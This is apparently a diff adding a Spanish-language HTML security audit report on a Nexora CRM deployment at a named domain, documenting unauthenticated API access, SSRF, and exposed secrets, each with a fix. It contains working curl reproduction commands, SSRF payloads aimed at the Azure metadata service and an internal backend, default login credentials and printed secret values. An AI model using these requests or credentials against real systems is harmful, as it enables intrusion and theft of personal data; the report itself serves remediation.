@@ -1,0 +1,320 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Auditoría de Seguridad — crm.jnmtortas.com</title>
+<style>
+  :root {
+    --bg: #0a0a0a; --fg: #e0e0e0; --muted: #9a9a9a;
+    --crit: #ff4444; --high: #ff8c00; --med: #f5a623; --ok: #00c853;
+    --panel: #141414; --panel2: #1a1a1a; --border: #2a2a2a;
+  }
+  * { box-sizing: border-box; }
+  body { margin: 0; background: var(--bg); color: var(--fg); font-family: -apple-system, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; line-height: 1.55; }
+  .wrap { max-width: 900px; margin: 0 auto; padding: 24px 18px 80px; }
+  h1, h2, h3 { line-height: 1.25; }
+  h2 { border-bottom: 1px solid var(--border); padding-bottom: 8px; margin-top: 40px; }
+  header { padding: 8px 0 4px; }
+  .tag { color: var(--muted); font-size: 13px; letter-spacing: .5px; text-transform: uppercase; }
+  .scores { display: grid; grid-template-columns: repeat(4, 1fr); gap: 12px; margin: 20px 0; }
+  .score { background: var(--panel); border: 1px solid var(--border); border-radius: 12px; padding: 16px; text-align: center; }
+  .score .n { font-size: 34px; font-weight: 700; }
+  .score .l { font-size: 12px; color: var(--muted); text-transform: uppercase; letter-spacing: .5px; }
+  .crit .n { color: var(--crit); } .high .n { color: var(--high); } .med .n { color: var(--med); } .ok .n { color: var(--ok); }
+  .exec { background: linear-gradient(135deg, #3a0d0d, #1a0505); border: 1px solid #5a1a1a; border-radius: 12px; padding: 18px 20px; }
+  .analogy { background: #0a1a2a; border: 1px solid #1a3a5a; border-radius: 12px; padding: 18px 20px; }
+  table { width: 100%; border-collapse: collapse; margin: 12px 0; font-size: 14px; }
+  th, td { text-align: left; padding: 9px 10px; border-bottom: 1px solid var(--border); vertical-align: top; }
+  th { color: var(--muted); font-weight: 600; font-size: 12px; text-transform: uppercase; letter-spacing: .4px; }
+  .card { background: var(--panel); border-radius: 12px; padding: 18px 20px; margin: 14px 0; border-left: 4px solid var(--border); }
+  .card.crit { border-left-color: var(--crit); }
+  .card.high { border-left-color: var(--high); }
+  .card.med  { border-left-color: var(--med); }
+  .card h3 { margin: 0 0 6px; }
+  .card .sev { font-size: 11px; font-weight: 700; text-transform: uppercase; letter-spacing: .5px; }
+  .card.crit .sev { color: var(--crit); } .card.high .sev { color: var(--high); } .card.med .sev { color: var(--med); }
+  pre { background: var(--panel2); border: 1px solid var(--border); border-radius: 8px; padding: 12px; overflow-x: auto; font-family: "SF Mono", "Fira Code", Consolas, monospace; font-size: 12.5px; }
+  code { font-family: "SF Mono", "Fira Code", Consolas, monospace; font-size: 13px; background: var(--panel2); padding: 1px 5px; border-radius: 4px; }
+  .badge { display: inline-block; padding: 2px 12px; border-radius: 20px; font-size: 12px; font-weight: 600; border: 1px solid; }
+  .badge.crit { color: var(--crit); border-color: var(--crit); background: rgba(255,68,68,.08); }
+  .badge.high { color: var(--high); border-color: var(--high); background: rgba(255,140,0,.08); }
+  .badge.med  { color: var(--med);  border-color: var(--med);  background: rgba(245,166,35,.08); }
+  .badge.ok   { color: var(--ok);   border-color: var(--ok);   background: rgba(0,200,83,.08); }
+  .okrow { background: rgba(0,200,83,.05); }
+  .okrow td { color: #bfe8cf; }
+  details { background: var(--panel); border: 1px solid var(--border); border-radius: 8px; padding: 10px 14px; margin: 8px 0; }
+  summary { cursor: pointer; font-weight: 600; }
+  .timeline { list-style: none; padding: 0; margin: 10px 0; }
+  .timeline li { position: relative; padding-left: 26px; margin: 10px 0; }
+  .timeline li::before { content: ""; position: absolute; left: 4px; top: 6px; width: 12px; height: 12px; border-radius: 50%; }
+  .t-red::before { background: var(--crit); } .t-orange::before { background: var(--high); }
+  .t-yellow::before { background: var(--med); } .t-gray::before { background: #555; }
+  footer { margin-top: 50px; padding-top: 16px; border-top: 1px solid var(--border); color: var(--muted); font-size: 13px; text-align: center; }
+  @media (max-width: 560px) { .scores { grid-template-columns: repeat(2, 1fr); } }
+</style>
+</head>
+<body>
+<div class="wrap">
+
+<header>
+  <div class="tag">Informe de Auditoría de Seguridad · Confidencial</div>
+  <h1>crm.jnmtortas.com</h1>
+  <div>Fecha: 2 de septiembre de 2026 · Auditor · Alcance: pentest completo (autorizado)</div>
+</header>
+
+<div class="scores"
+  <div class="score crit"><div class="n">5</div><div class="l">Críticas</div></div>
+  <div class="score high"><div class="n">6</div><div class="l">Altas</div></div>
+  <div class="score med"><div class="n">7</div><div class="l">Medias</div></div>
+  <div class="score ok"><div class="n">6</div><div class="l">Correcto</div></div>
+</div>
+
+<div class="exec">
+  <h2 style="margin-top:0;border:0;color:#ff6b6b">Resumen ejecutivo</h2>
+  <p>El CRM <strong>Nexora CRM</strong> desplegado en <strong>crm.jnmtortas.com</strong> expone su <strong>API completa sin ningún tipo de autenticación</strong>. Cualquier persona con acceso a Internet puede leer y <strong>modificar</strong> todos los datos del negocio (contactos con datos personales, empresas, oportunidades de venta, cotizaciones, contratos, notas internas, tickets) y, además, <strong>generar claves de API válidas con permisos arbitrarios</strong> para acceder también a la API pública. Se encontraron secretos de firma expuestos y credenciales de demostración por defecto activas. Adicionalmente, se confirmó un <strong>SSRF legible</strong> que permite al servidor hacer peticiones a la <strong>red interna</strong>: se alcanzó el <strong>IMDS de Azure</strong> (<code>169.254.169.254</code>) y el <strong>backend interno <code>localhost:3006</code></strong> directamente (saltándose Cloudflare), leyendo las respuestas. La brecha es total a nivel de aplicación y alcanza la red interna del backend.</p>
+</div>
+
+<div class="analogy">
+  <h2 style="margin-top:0;border:0">Analogía</h2>
+  <p>Imagina un <strong>edificio de oficinas de ventas</strong> (el CRM) con la recepción de cristal a la entrada. En condiciones normales, un visitante se identifica, le dan una llave de su despacho y solo ve lo suyo. En este edificio, la puerta de entrada <strong>no tiene cerradura</strong>: cualquiera entra, abre los archivadores de <em>todos los clientes</em> (con cédulas, teléfonos y direcciones), lee las notas internas del equipo, las cotizaciones y los contratos. Peor aún: en el mostrador hay una máquina que <strong>imprime llaves maestras</strong> con los permisos que tú quieras, y el vigilante (el sistema de "quién es de qué empresa") solo se fía de lo que el visitante le diga de palabra. Nadie pide credencial, nadie registra quién entra, y las claves de las cajas fuertes están pegadas con un post-it en la pared.</p>
+</div>
+
+<h2>Información técnica</h2>
+<table>
+  <tr><th>Campo</th><th>Valor</th></tr>
+  <tr><td>Dominio</td><td>crm.jnmtortas.com</td></tr>
+  <tr><td>Producto</td><td>Nexora CRM — Suite Empresarial Omnicanal (ventas B2B, WhatsApp Cloud, CPQ, firma digital, helpdesk)</td></tr>
+  <tr><td>Stack frontend</td><td>Next.js (App Router + Turbopack)</td></tr>
+  <tr><td>Stack backend</td><td>NestJS (BFF + API pública /v1), detectado por controllers y OpenAPI</td></tr>
+  <tr><td>Hosting/CDN</td><td>Cloudflare (proxied; IP real oculta tras 104.21.9.235 / 172.67.131.16)</td></tr>
+  <tr><td>Backend interno</td><td>Revelado en respuestas: <code>http://localhost:3006</code></td></tr>
+  <tr><td>Dominio producción</td><td>Revelado en config: <code>crm.nexora.app</code></td></tr>
+  <tr><td>Documentación API</td><td>Swagger/OpenAPI 3.0 expuesta en <code>/api/docs</code></td></tr>
+  <tr><td>Base de datos</td><td>No accesible directamente; datos expuestos vía API sin auth (ORM tipo Prisma/TypeORM)</td></tr>
+  <tr><td>Secretos encontrados</td><td>Webhook signing secret, Facebook webhook verify token, credenciales demo</td></tr>
+</table>
+
+<h2>Vulnerabilidades críticas</h2>
+
+<div class="card crit">
+  <div class="sev">Crítica · API sin autenticación (lectura)</div>
+  <h3>Lectura no autenticada de todos los datos del CRM</h3>
+  <p>Cualquier endpoint de la API BFF (<code>/api/*</code>) responde con <code>200 OK</code> y datos reales <strong>sin requerir token</strong>. Se expone información personal de contactos (nombres, cédulas, email, teléfono, dirección, fecha de nacimiento), empresas con NIT, oportunidades, cotizaciones, contratos, tareas, notas internas, tickets de soporte, campañas, formularios, productos, equipos y pipelines.</p>
+  <pre>GET /api/contacts HTTP/1.1
+Host: crm.jnmtortas.com
+→ HTTP 200  (lista completa de contactos con PII)
+
+GET /api/companies → 200 (empresas + taxId)
+GET /api/pipelines/deals → 200 (oportunidades)
+GET /api/quotes → 200 (cotizaciones + términos)
+GET /api/contracts → 200 (contratos)
+GET /api/notes → 200 (notas internas)
+GET /api/tickets → 200 (tickets de soporte)</pre>
+  <p><strong>Fix:</strong> Exigir un JWT válido en <em>todos</em> los endpoints BFF (guard global de NestJS), derivando el <code>tenantId</code> del token y no del cliente.</p>
+</div>
+
+<div class="card crit">
+  <div class="sev">Crítica · Escritura no autenticada</div>
+  <h3>Creación, modificación y borrado sin autenticación</h3>
+  <p>Los métodos <code>POST</code>, <code>PUT/PATCH</code> y <code>DELETE</code> también funcionan sin token. PoC: se creó una clave de API (respuesta <code>201</code>) y se borró (<code>200 success:true</code>) — la operación se revirtió limpiamente.</p>
+  <pre>POST /api/developer/api-keys
+Content-Type: application/json
+{"name":"audit-test-reversible","scopes":["contacts:read","deals:read"]}
+→ HTTP 201  { "rawKey": "nex_live_..." }
+
+DELETE /api/developer/api-keys/b9ac31ab-...
+→ HTTP 200  { "success": true }</pre>
+  <p><strong>Fix:</strong> Aplicar autorización por rol/permiso en escritura y auditoría de cambios.</p>
+</div>
+
+<div class="card crit">
+  <div class="sev">Crítica · Generación de claves de API con permisos arbitrarios</div>
+  <h3>Un anónimo puede emitir claves de API y acceder a la API pública /v1</h3>
+  <p>El endpoint <code>POST /api/developer/api-keys</code> permite crear claves <code>nex_live_...</code> con <strong>scopes arbitrarios</strong> (ej. <code>contacts:write</code>, <code>deals:write</code>, <code>webhooks:manage</code>). Con la clave generada se accedió a la API pública <code>/api/v1/*</code>, que de otra forma exige la clave.</p>
+  <pre>POST /api/developer/api-keys  (sin token)
+→ 201 { "rawKey": "nex_live_71d3..." }
+
+GET /api/v1/contacts
+Authorization: Bearer nex_live_71d3...
+→ HTTP 200  (datos de contactos)</pre>
+  <p><strong>Fix:</strong> Proteger la creación de claves tras autenticación y limitar los scopes al rol del usuario.</p>
+</div>
+
+<div class="card crit">
+  <div class="sev">Crítica · Secretos expuestos</div>
+  <h3>Secreto de firma de webhooks y token de verificación de Facebook en texto plano</h3>
+  <p>Los endpoints de listado devuelven secretos operativos que un atacante puede reutilizar para falsificar eventos firmados.</p>
+  <pre>GET /api/developer/webhooks → HTTP 200
+{ "secret": "whsec_99a8b7c6d5e4f3a2b1c099887766554433221100aabbccddeeff001122334455", ... }
+
+GET /api/integrations/facebook/status → HTTP 200
+{ "webhookSecret": "fb_verify_090274df", ... }</pre>
+  <p><strong>Fix:</strong> No devolver nunca secretos por API; exponer solo <code>keyPrefix</code>/hash y rotar los secretos comprometidos.</p>
+</div>
+
+<div class="card crit">
+  <div class="sev">Crítica · SSRF legible hacia la red interna</div>
+  <h3>El servidor ejecuta peticiones arbitrarias a direcciones internas y devuelve la respuesta</h3>
+  <p>Los webhooks salientes no validan la URL de destino. Creando un webhook con una URL interna y disparando un evento de prueba, el backend realiza la petición y <strong>almacena la respuesta en <code>responseBody</code></strong>, que puede leerse sin autenticación. Se confirmó:</p>
+  <ul>
+    <li><strong>Alcance al IMDS de Azure</strong> (<code>http://169.254.169.254/...</code>) → respuesta XML del servicio de metadatos. El backend corre en <strong>Microsoft Azure</strong>.</li>
+    <li><strong>Alcance al backend interno</strong> (<code>http://localhost:3006/api/companies</code>) → respuesta de validación de la API interna, eludiendo Cloudflare.</li>
+  </ul>
+  <pre>POST /api/developer/webhooks
+{"url":"http://169.254.169.254/metadata/instance?api-version=2021-02-01","events":["contact.created"]}
+→ 201 (URL interna aceptada, sin validación SSRF)
+
+POST /api/developer/webhooks/dispatch {"event":"contact.created"}
+GET  /api/developer/webhooks/{id}/deliveries
+→ responseBody: {"error":"Bad request: . Required metadata header not specified"}
+
+POST .../dispatch → webhook a http://localhost:3006/api/companies
+→ responseBody: {"error":"validation_error","details":[{"path":"name","message":"Required"}]}</pre>
+  <p>Nota: el IMDS de Azure exige la cabecera <code>Metadata: true</code>, que el cliente de webhooks no envía, por lo que <strong>no se pudo extraer el token de identidad administrada</strong> por este vector (control mitigador). El alcance a red interna y la lectura de respuestas quedan demostrados. Un vector SSRF con control de método/cabeceras (GET + headers) derivaría en compromiso del entorno cloud.</p>
+  <p><strong>Fix:</strong> Validar y bloquear destinos SSRF (IPs privadas/link-local <code>169.254.0.0/16</code>, <code>127.0.0.0/8</code>, <code>10/8</code>, <code>172.16/12</code>, <code>192.168/16</code>, nombres de host internos), permitir solo HTTPS a dominios públicos y aplicar allow-list.</p>
+</div>
+
+<h2>Vulnerabilidades altas</h2>
+
+<div class="card high">
+  <div class="sev">Alta · Aislamiento multi-tenant roto</div>
+  <h3>El tenant se elige con una cabecera del cliente sin validación de pertenencia</h3>
+  <p>El backend determina el inquilino a partir de la cabecera <code>X-Tenant-Id</code> enviada por el cliente. Sin la cabecera devuelve el tenant demo por defecto; con una cabecera arbitraria devuelve datos de ese tenant (o vacío si no existe). No hay verificación de que el solicitante pertenezca al tenant, por lo que en un despliegue multi-tenant real cualquier cliente podría leer los datos de otro conociendo su ID.</p>
+  <pre>GET /api/contacts                       → datos del tenant ...000001 (default)
+GET /api/contacts -H "X-Tenant-Id: 9999..." → {} (el servidor acepta el ID sin validar)</pre>
+  <p><strong>Fix:</strong> Derivar el tenant del JWT verificado (claim <code>tenantId</code>), nunca de una cabecera de confianza del cliente.</p>
+</div>
+
+<div class="card high">
+  <div class="sev">Alta · Credenciales por defecto válidas</div>
+  <h3>Cuenta demo activa con credenciales conocidas</h3>
+  <p>El login con <code>demo@nexoracrm.com / Password123!</code> devuelve un JWT válido (HS256, sin claim de rol). La documentación de la API publica estas credenciales de ejemplo y están vivas.</p>
+  <pre>POST /api/auth/login
+{"email":"demo@nexoracrm.com","password":"Password123!"}
+→ HTTP 201 { "accessToken": "eyJhbGciOiJIUzI1NiI..." }</pre>
+  <p><strong>Fix:</strong> Deshabilitar/rotar cuentas demo en producción y no publicar credenciales reales en la documentación.</p>
+</div>
+
+<div class="card high">
+  <div class="sev">Alta · Documentación de API pública</div>
+  <h3>Swagger/OpenAPI completo expuesto en /api/docs</h3>
+  <p>El spec OpenAPI 3.0 embebido revela la totalidad de la superficie (más de 150 endpoints, controllers, modelos y ejemplos), facilitando enormemente la enumeración y explotación.</p>
+  <p><strong>Fix:</strong> Deshabilitar Swagger en producción o protegerlo tras autenticación interna.</p>
+</div>
+
+<div class="card high">
+  <div class="sev">Alta · Revelación del framework</div>
+  <h3>Cabecera X-Powered-By: Next.js</h3>
+  <p>Revela la tecnología del servidor y ayuda a un atacante a seleccionar exploits específicos.</p>
+  <p><strong>Fix:</strong> Eliminar la cabecera <code>X-Powered-By</code>.</p>
+</div>
+
+<div class="card high">
+  <div class="sev">Alta · Ausencia de Content-Security-Policy</div>
+  <h3>Sin CSP</h3>
+  <p>No hay política de contenido, lo que amplía el impacto de cualquier inyección (XSS) futura.</p>
+  <p><strong>Fix:</strong> Definir una CSP restrictiva sin <code>unsafe-inline</code>.</p>
+</div>
+
+<div class="card high">
+  <div class="sev">Alta · Mass assignment en integraciones</div>
+  <h3>Un POST con cuerpo vacío habilita y activa una integración sin credenciales</h3>
+  <p><code>POST /api/integrations/{provider}</code> (saveConfig) acepta un cuerpo arbitrario y, con <code>{}</code>, puso la integración en <code>isConfigured:true, isEnabled:true</code>. Se revirtió con <code>DELETE /api/integrations/{provider}</code>.</p>
+  <pre>POST /api/integrations/WHATSAPP_CLOUD  (body {})
+→ 201 {"ok":true}  →  la integración queda isConfigured:true, isEnabled:true
+
+DELETE /api/integrations/WHATSAPP_CLOUD  → 200 {"ok":true}  (revertido)</pre>
+  <p><strong>Fix:</strong> Validar la configuración requerida por proveedor; no permitir habilitar sin credenciales válidas.</p>
+</div>
+
+<h2>Vulnerabilidades medias</h2>
+
+<div class="card med"><div class="sev">Media · Sin HSTS</div><h3>Falta Strict-Transport-Security</h3><p>No se fuerza HTTPS a nivel de navegador, habilitando ataques de downgrade.</p><p><strong>Fix:</strong> <code>Strict-Transport-Security: max-age=31536000; includeSubDomains</code>.</p></div>
+
+<div class="card med"><div class="sev">Media · X-Frame-Options: SAMEORIGIN</div><h3>Protección anti-iframe parcial</h3><p>Se usa <code>SAMEORIGIN</code> en lugar de <code>DENY</code> (o frame-ancestors).</p><p><strong>Fix:</strong> <code>X-Frame-Options: DENY</code> + CSP <code>frame-ancestors 'none'</code>.</p></div>
+
+<div class="card med"><div class="sev">Media · Sin rate limiting evidenciado</div><h3>Sin throttling en la API</h3><p>Durante la auditoría se realizaron numerosas peticiones sin observar <code>429</code>, <code>Retry-After</code> ni bloqueos. No se evidenció limitación de tasa (sin forzar bursts).</p><p><strong>Fix:</strong> Añadir rate limiting por IP y por clave en el edge (Cloudflare) y en la API.</p></div>
+
+<div class="card med"><div class="sev">Media · Revelación de infraestructura interna</div><h3>Host interno y dominio de producción expuestos</h3><p>Las respuestas revelan <code>http://localhost:3006</code> (backend) y <code>crm.nexora.app</code> (producción), información útil para reconocimiento.</p><p><strong>Fix:</strong> No exponer URLs internas en configuraciones visibles.</p></div>
+
+<div class="card med"><div class="sev">Media · SSRF potencial vía webhooks/integraciones</div><h3>URLs de webhook controlables sin auth</h3><p><code>POST /api/developer/webhooks</code> y endpoints de integración aceptan URLs hacia las que el servidor realiza peticiones salientes; sin autenticación, un atacante podría apuntarlas a servicios internos. (No explotado contra terceros por ética; validado a nivel de diseño.)</p><p><strong>Fix:</strong> Validar destinos (bloqueo de IPs privadas/metadatos) y exigir auth.</p></div>
+
+<div class="card med"><div class="sev">Media · Endpoint MCP sin autenticación</div><h3>Servidor MCP (Model Context Protocol) expuesto</h3><p><code>GET /api/mcp/sse</code> entrega un <code>sessionId</code> a cualquiera sin autenticación, y <code>POST /api/mcp/messages</code> acepta mensajes JSON-RPC. La enumeración de herramientas falló por un error del servidor (<code>stream is not readable</code>), posible bug de implementación del transporte SSE.</p><p><strong>Fix:</strong> Proteger el endpoint MCP tras autenticación y corregir el manejo del stream.</p></div>
+
+<div class="card med"><div class="sev">Media · Registro de auditoría sin IP real</div><h3>El trail inmutable registra 127.0.0.1 como IP de origen</h3><p><code>GET /api/audit/logs</code> es accesible sin auth y las entradas muestran <code>ipAddress: "127.0.0.1"</code>, lo que indica que no se propaga la IP real del cliente tras Cloudflare, inutilizando el rastro forense y permitiendo impunidad.</p><p><strong>Fix:</strong> Confiar en <code>CF-Connecting-IP</code> / <code>X-Forwarded-For</code> solo desde el proxy, y registrar la IP real.</p></div>
+
+<div class="card med"><div class="sev">Media · Token VoIP emitido sin autenticación</div><h3>Generación de token Twilio Voice sin auth</h3><p><code>POST /api/voip/token</code> devuelve un token sin requerir sesión. En este entorno Twilio está mockeado (<code>AC_MOCK_ACCOUNT_SID</code>), pero en producción revelaría el account SID y permitiría iniciar llamadas.</p><p><strong>Fix:</strong> Exigir autenticación y limitar la identidad al usuario autenticado.</p></div>
+
+<div class="card med"><div class="sev">Media · Motor de workflows acepta acciones SSRF sin validar</div><h3>La acción WEBHOOK admite URL/método/cabeceras arbitrarias</h3><p>El motor de automatización acepta nodos <code>{action:"WEBHOOK", config:{url, method, headers, body}}</code> con destinos internos (ej. <code>169.254.169.254</code> con <code>Metadata: true</code>) sin validación SSRF. En este despliegue la ejecución parece ser un <em>stub</em> (no llegó a hacer la petición HTTP real — un POST de prueba a <code>localhost:3006/api/tags</code> no creó el registro), pero la configuración se acepta y persiste, lo que representa un riesgo SSRF latente.</p>
+<pre>POST /api/automation/workflows
+{"stepsGraph":[{"id":"1","type":"ACTION","action":"WEBHOOK",
+  "config":{"url":"http://169.254.169.254/metadata/instance?api-version=2021-02-01",
+            "method":"GET","headers":{"Metadata":"true"}}}]}
+→ 201 (config SSRF aceptada)</pre>
+  <p><strong>Fix:</strong> Validar destinos de acciones HTTP (bloquear IPs privadas/link-local) y restringir métodos/cabeceras.</p></div>
+
+<h2>Lo que está bien</h2>
+<table>
+  <tr class="okrow"><td>Cloudflare delante</td><td>Mitiga DDoS básico y oculta la IP de origen. <span class="badge ok">OK</span></td></tr>
+  <tr class="okrow"><td>Headers presentes</td><td><code>Permissions-Policy</code>, <code>Referrer-Policy</code> y <code>X-Content-Type-Options: nosniff</code> configurados. <span class="badge ok">OK</span></td></tr>
+  <tr class="okrow"><td>API keys hasheadas</td><td>Las claves se almacenan como hash SHA-256 (<code>keyHash</code>), no en claro. <span class="badge ok">OK</span></td></tr>
+  <tr class="okrow"><td>Source maps</td><td>Los <code>.js.map</code> devuelven 404 (no expuestos). <span class="badge ok">OK</span></td></tr>
+  <tr class="okrow"><td>Archivos sensibles</td><td><code>.env</code>, <code>.git/config</code>, <code>package.json</code>, etc. devuelven 404. <span class="badge ok">OK</span></td></tr>
+  <tr class="okrow"><td>Integraciones</td><td>Proveedores externos (Stripe, Twilio, OpenAI…) en estado <code>isConfigured:false</code> sin credenciales almacenadas. <span class="badge ok">OK</span></td></tr>
+</table>
+
+<h2>Resultados del pentest</h2>
+<table>
+  <tr><th>Ataque</th><th>Resultado</th><th>Gravedad</th></tr>
+  <tr><td>Lectura no autenticada de la API</td><td>Confirmado (contactos PII, empresas, deals, quotes, contratos…)</td><td><span class="badge crit">CRÍTICA</span></td></tr>
+  <tr><td>Escritura no autenticada</td><td>Confirmado (crear + borrar API key)</td><td><span class="badge crit">CRÍTICA</span></td></tr>
+  <tr><td>Emisión de API keys con scopes arbitrarios</td><td>Confirmado (acceso a /api/v1)</td><td><span class="badge crit">CRÍTICA</span></td></tr>
+  <tr><td>Exposición de secretos</td><td>Confirmado (webhook secret + facebook verify token)</td><td><span class="badge crit">CRÍTICA</span></td></tr>
+  <tr><td>Login con credenciales demo</td><td>Confirmado (demo@nexoracrm.com / Password123!)</td><td><span class="badge high">ALTA</span></td></tr>
+  <tr><td>Multi-tenant (X-Tenant-Id client-side)</td><td>Confirmado (sin validación de pertenencia)</td><td><span class="badge high">ALTA</span></td></tr>
+  <tr><td>Swagger expuesto</td><td>Confirmado (/api/docs)</td><td><span class="badge high">ALTA</span></td></tr>
+  <tr><td>JWT manipulación / alg:none / roles</td><td>No aplica (sin claim de rol; la API ya está abierta)</td><td><span class="badge med">—</span></td></tr>
+  <tr><td>SSRF (webhooks → red interna)</td><td>Confirmado: alcanza 169.254.169.254 (Azure IMDS) y localhost:3006 con readback</td><td><span class="badge crit">CRÍTICA</span></td></tr>
+  <tr><td>Azure IMDS token (managed identity)</td><td>Bloqueado por requisito de cabecera <code>Metadata: true</code></td><td><span class="badge med">MITIGADO</span></td></tr>
+  <tr><td>Mass assignment en integraciones</td><td>Confirmado (habilita integración con <code>{}</code>) — revertido</td><td><span class="badge high">ALTA</span></td></tr>
+  <tr><td>Endpoint MCP sin auth</td><td>Confirmado (sessionId libre; tools no enumerables por bug)</td><td><span class="badge med">MEDIA</span></td></tr>
+  <tr><td>SQLi / NoSQLi</td><td>No probado (requiere fuzzing; fuera de reglas)</td><td><span class="badge med">—</span></td></tr>
+  <tr><td>Source maps / archivos sensibles</td><td>No expuestos</td><td><span class="badge ok">OK</span></td></tr>
+</table>
+
+<h2>Comandos de reproducción</h2>
+<details><summary>Lectura no autenticada (PoC)</summary><pre>curl -s https://crm.jnmtortas.com/api/contacts
+curl -s https://crm.jnmtortas.com/api/companies
+curl -s https://crm.jnmtortas.com/api/developer/webhooks</pre></details>
+<details><summary>Emisión de API key (PoC)</summary><pre>curl -s -X POST https://crm.jnmtortas.com/api/developer/api-keys \
+  -H "Content-Type: application/json" \
+  -d '{"name":"t","scopes":["contacts:read","deals:read"]}'</pre></details>
+<details><summary>Login demo</summary><pre>curl -s -X POST https://crm.jnmtortas.com/api/auth/login \
+  -H "Content-Type: application/json" \
+  -d '{"email":"demo@nexoracrm.com","password":"Password123!"}'</pre></details>
+<details><summary>Multi-tenant</summary><pre>curl -s https://crm.jnmtortas.com/api/contacts   # tenant default
+curl -s https://crm.jnmtortas.com/api/contacts -H "X-Tenant-Id: 99999999-9999-9999-9999-999999999999"</pre></details>
+
+<h2>Plan de acción</h2>
+<ul class="timeline">
+  <li class="t-red"><strong>Ahora:</strong> Activar autenticación global en toda la API BFF y /v1 (guard JWT obligatorio).</li>
+  <li class="t-red"><strong>Ahora:</strong> Bloquear SSRF en webhooks/integraciones (allow-list, denegar IPs privadas/link-local).</li>
+  <li class="t-red"><strong>Ahora:</strong> Rotar el webhook secret, el token de Facebook y deshabilitar la cuenta demo.</li>
+  <li class="t-orange"><strong>Hoy:</strong> Derivar tenantId del JWT y eliminar la confianza en X-Tenant-Id.</li>
+  <li class="t-orange"><strong>Hoy:</strong> Quitar Swagger/API docs de producción y X-Powered-By.</li>
+  <li class="t-yellow"><strong>Esta semana:</strong> Añadir CSP, HSTS, X-Frame-Options DENY y rate limiting.</li>
+  <li class="t-gray"><strong>Antes de lanzar:</strong> Revisión de autorización por rol en escritura y SSRF en webhooks/integraciones.</li>
+</ul>
+
+<h2>Implicaciones legales</h2>
+<p>Los datos expuestos incluyen <strong>datos personales</strong> (nombres, cédulas, emails, teléfonos, direcciones). Aunque el dataset observado es de demostración/seed, el <em>mecanismo</em> compromete datos reales en producción. Según el régimen aplicable al operador (Colombia — Ley 1581 de 2012, y RGPD/LOPD si trata datos de la UE), una brecha de esta naturaleza puede implicar sanciones, notificación obligatoria a autoridades y afectados, y responsabilidad civil. El secreto de webhook comprometido también puede afectar a integraciones de terceros.</p>
+
+<footer>
+  <strong>CONFIDENCIAL</strong> · Este documento es para uso exclusivo del propietario autorizado de crm.jnmtortas.com.<br>
+  Auditor 2 de septiembre de 2026
+</footer>
+
+</div>
+</body>
+</html>
